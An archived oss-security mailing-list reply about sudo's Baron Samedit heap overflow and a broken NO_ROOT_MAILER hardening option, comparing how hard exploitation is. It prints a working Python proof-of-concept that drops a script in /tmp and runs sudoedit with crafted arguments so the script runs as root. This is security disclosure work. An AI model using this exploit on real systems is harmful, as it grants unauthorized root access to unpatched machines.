X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2187" "Monday" "15" "February" "2021" "08:06:44" "+0000" "Roman Fiedler" "roman.fiedler@unparalleled.eu" nil "68" "Re: [oss-security] sudo: Ineffective NO_ROOT_MAILER and Baron Samedit" nil nil nil "2" nil nil (number mark "U       roman.fiedle Feb 15   68/2187  " thread-indent "\"Re: [oss-security] sudo: Ineffective NO_ROOT_MAILER and Baron Samedit\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] sudo: Ineffective NO_ROOT_MAILER and Baron Samedit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30578 invoked by uid 550); 15 Feb 2021 09:17:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 8018 invoked from network); 15 Feb 2021 08:07:19 -0000
From: Roman Fiedler <roman.fiedler@unparalleled.eu>
To: oss-security@lists.openwall.com
In-reply-to: <9159-1611958545.228355@RO_f.XC4o.3wJr>
References: <9159-1611958545.228355@RO_f.XC4o.3wJr>
Comments: In-reply-to Roman Fiedler <roman.fiedler@unparalleled.eu>
   message dated "Fri, 29 Jan 2021 22:15:45 +0000."
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
Date: Mon, 15 Feb 2021 08:06:44 +0000
Message-ID: <2645-1613376404.018580@le5V.JgUV.WnPT>
Subject: Re: [oss-security] sudo: Ineffective NO_ROOT_MAILER and Baron Samedit

Roman Fiedler writes:
> Hello list,
>
> While reproducing the exploitation of "Baron Samedit" another
> minor issue in Sudo was discovered. It affects Sudo 1.9.4
> and newer and renders the "NO_ROOT_MAILER" hardening option
> useless. While this bug by itself is not known to be exploitable
> on its own, combining it with the "Baron Samedit" heap overflow
> eases exploitation of the later tremendously.
> ...

Now sudo patches are already deployed widely, so this is how
the NO_ROOT_MAILER flag influenced exploit complexity:

* With "NO_ROOT_MAILER" working using "nss_load_library" method,
e.g. implemented by blasty: main program
https://github.com/blasty/CVE-2021-3156/blob/main/hax.c
(140 lines with 18 lines header) and the library to be loaded
https://github.com/blasty/CVE-2021-3156/blob/main/lib.c
(16 lines), total 156 lines.

* Without "NO_ROOT_MAILER": love-letter-to-the-baron.py
(43 lines with 18 lines header).


heraldName =3D '/tmp/XXXXXXXXXXXXXXXXXXXXXXXXX'
heraldFd =3D os.open(heraldName, os.O_WRONLY|os.O_CREAT|os.O_TRUNC|os.O_NOC=
TTY)
os.write(
    heraldFd,
    b'#!/bin/sh\ncat <<EOF > /the-letter.txt\nMy dearest Baron,...\n\nWith =
love,\nX*96\n\nLegal disclaimer:\n\n' + bytes(disclaimer, 'utf8') + b'\nEOF=
\n')
os.fchmod(heraldFd, 0o755)
os.close(heraldFd)

devNullHandle =3D os.open('/dev/null', os.O_RDONLY)
letterEnv =3D {
    'LC_ALL': 'C.UTF-8',
    'LANGUAGE': 'A'*84}
letterArgs =3D [
    '/usr/bin/sudoedit', '-S', '-s', '\\',
    'X'*96 + heraldName]
process =3D subprocess.Popen(
    letterArgs, stdin=3DdevNullHandle, env=3DletterEnv, cwd=3D"/")
process.wait()


Note: I know that line numbers are not a perfect measure for
complexity, it is just a very poor approximation.



I also collected some historic information (software archeology)
on the security-ping-pong around "NO_ROOT_MAILER" feature:
https:///unparalleled.eu/blog/2021/20210215-a-love-letter-to-the-baron-part=
2/

Kind regads,
Roman

| |  DI Roman Fiedler
| /  roman.fiedler at unparalleled.eu  +43 677 63 29 28 29
/ |  Unparalleled IT Services e.U.     FN: 516074h           VAT: ATU750505=
24
| |  https://unparalleled.eu/          Felix-Dahn-Platz 4, 8010 Graz, Austr=
ia

